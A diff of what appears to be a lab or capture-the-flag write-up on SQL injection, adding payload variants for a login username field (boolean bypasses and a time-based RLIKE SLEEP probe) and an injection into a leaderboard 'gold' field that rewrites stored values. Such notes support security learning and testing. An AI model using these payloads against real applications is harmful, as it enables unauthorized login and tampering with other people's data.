@@ -138,14 +138,15 @@ Injection to `username` POST field:
 
 ```sql
 '||1=1;-- //there is an explicit space right after the comment (--)
+||1=1;-- - //clearer
 ```
 
 
 
 * This works with space in between the items too:&#x20;
 
-```
-' || 1=1;-- 
+```sql
+' || 1=1;-- -
 ```
 
 `' || 1=1; --`&#x20;
@@ -168,7 +169,21 @@ I found that the following payload to the username field works too:
 
 ```sql
 ' RLIKE SLEEP(3) -- // explicit space after the comment (--) 
+' RLIKE SLEEP(3) -- - // clearer
 ```
+
+#### Further manual testing
+
+I found that the following payloads works too:
+
+> Note: In MySQL, `#` is a comment
+
+```sql
+' OR 'x'='x';-- -
+' OR 'x'='x'#  
+```
+
+{% embed url="https://github.com/payloadbox/sql-injection-payload-list" %}
 
 #### (2) Edit leader board
 
@@ -205,6 +220,7 @@ Injection to the `gold` field:
 
 ```sql
 22, silver = 22, bronze = 22;-- // explicit space after comment (--)
+22, silver = 22, bronze = 22;-- - // clearer
 ```
 
 ```sql
